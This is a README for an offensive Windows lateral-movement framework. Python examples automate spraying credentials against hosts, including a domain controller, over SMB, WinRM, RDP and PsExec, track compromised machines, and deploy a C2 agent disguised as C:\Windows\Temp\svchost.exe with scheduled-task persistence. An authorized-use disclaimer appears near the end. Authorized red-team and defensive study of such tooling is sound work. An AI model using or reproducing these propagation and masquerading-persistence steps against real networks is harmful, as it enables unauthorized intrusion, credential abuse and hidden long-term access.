# Lateral Movement Framework

**Professional-Grade Automated Network Propagation for Authorized Red Team Operations**

A comprehensive framework for systematic lateral movement across Windows networks. Automates credential testing, authentication verification, and agent deployment for authorized penetration testing engagements.

## Overview

The Lateral Movement Framework provides professional-grade automation for:

1. **Credential Testing** - Systematic validation against multiple targets
2. **Multi-Method Authentication** - SMB, WinRM, RDP, PsExec
3. **Agent Deployment** - Automated payload deployment and persistence
4. **Campaign Management** - Complete tracking and reporting

## Features

- ✅ **4 Authentication Methods** - SMB, WinRM, RDP, PsExec
- ✅ **Smart Campaign Management** - Track targets, credentials, and success rates
- ✅ **Automated Deployment** - Agent deployment with persistence options
- ✅ **Comprehensive Reporting** - JSON export and human-readable reports
- ✅ **Credential Tracking** - Success rates, high-value identification
- ✅ **Target Management** - Status tracking, compromise history

## Quick Start

```python
from lateral_movement import LateralMovementHandler, Target, Credential

# Initialize handler
handler = LateralMovementHandler(campaign_id="engagement-2024")

# Add targets
handler.add_target(ip_address="10.10.10.51", hostname="server01")
handler.add_target(ip_address="10.10.10.52", hostname="dc01.corp.local")

# Add credentials
handler.add_credential(username="admin", password="P@ssw0rd123", privilege_level="admin")
handler.add_credential(username="jsmith", password="Summer2024!")

# Execute campaign
handler.propagate()
```

## Authentication Methods

| Method | Port | Tool Required | Use Case |
|--------|------|---------------|----------|
| SMB | 445 | smbclient | File shares, basic auth |
| WinRM | 5985/5986 | evil-winrm | PowerShell remoting |
| RDP | 3389 | xfreerdp | Desktop access verification |
| PsExec | 445 | Impacket | Remote execution |

## Campaign Management

```python
# Access campaign statistics
stats = handler.campaign.get_statistics()
print(f"Success Rate: {stats['success_rate']}")
print(f"Compromised: {stats['compromised_targets']}")

# Get high-value credentials
high_value = handler.campaign.get_high_value_credentials()
for cred in high_value:
    print(f"{cred.get_identifier()}: {cred.get_success_rate():.1f}% success")

# Save campaign data
handler.campaign.save_to_file("campaign_results.json")
```

## Deployment

```python
from lateral_movement.modules import AgentDeployer, DeploymentPayload

deployer = AgentDeployer()

# Add custom payload
payload = DeploymentPayload(
    name="custom_agent",
    local_path="./agent.exe",
    remote_path="C:\\Windows\\Temp\\svchost.exe",
    description="Custom C2 agent",
    persistence_method="scheduled_task"
)

deployer.add_payload(payload)
```

## Legal & Ethical Use

⚠️ **AUTHORIZED USE ONLY** ⚠️

This framework is designed exclusively for:
- Authorized penetration testing engagements
- Red team operations with explicit written permission
- Security research in controlled environments

Unauthorized access to computer systems is illegal. Users are responsible for obtaining proper authorization and complying with all applicable laws.

## License

MIT License - See LICENSE file for details.

---

**Built by operators, for operators.** 🔴
